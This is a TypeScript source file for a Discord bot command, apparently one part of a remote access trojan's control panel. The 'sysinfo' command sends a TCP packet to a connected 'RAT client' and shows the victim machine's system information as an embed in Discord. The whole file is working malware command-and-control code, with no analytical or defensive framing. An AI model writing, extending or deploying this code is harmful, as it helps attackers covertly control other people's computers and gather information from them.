import { ChatInputCommandInteraction, Colors, EmbedBuilder, PermissionsBitField } from "discord.js";
import Command from "../base/classes/Command";
import CustomClient from "../base/classes/CustomClient";
import Category from "../base/enums/Category";
import TcpPacket from "../base/classes/TcpPacket";
import Code from "../base/enums/Codes";

export default class SysInfo extends Command {
    constructor(client: CustomClient) {
        super(client, {
            name: "sysinfo",
            description: "Affiche les informations système du client.",
            category: Category.Utilities,
            dm_permissions: false,
            default_member_permissions: PermissionsBitField.Flags.UseApplicationCommands,
            cooldown: 3,
            options: []
        });
    }

    async Execute(interaction: ChatInputCommandInteraction) {
        await interaction.deferReply({ ephemeral: false });

        let RATClient = await this.client.getRATClient(interaction);
        if (!RATClient) {
            return;
        }

        let packet = new TcpPacket(Code.SYS_INFO, Buffer.from([0x01]));
        RATClient.send(packet);
        let response = await RATClient.receive();

        if (response?.code !== Code.SUCCESS) {
            return interaction.editReply({
                content: "Erreur: impossible de récupérer les informations système.",
            });
        }
        if (!response?.payload) {
            return interaction.editReply({
                content: "Erreur: impossible de récupérer les informations système."
            });
        }

        let data = response.payload.toString();

        return interaction.editReply({
            content: "",
            embeds: [getSysInfoEmbed(data)]
        });
    }
}

function getSysInfoEmbed(data: string): EmbedBuilder {
    let sections = data.split("|");

    let embedFields = sections.map(section => {
        let fields = section.split("\n");
        let name = fields[0];
        let value = fields.slice(1).join("\n");
        return { name, value };
    })

    let embed = new EmbedBuilder()
        .setTitle("Informations système")
        .addFields(embedFields)
        .setColor(Colors.Gold);

    return embed;
}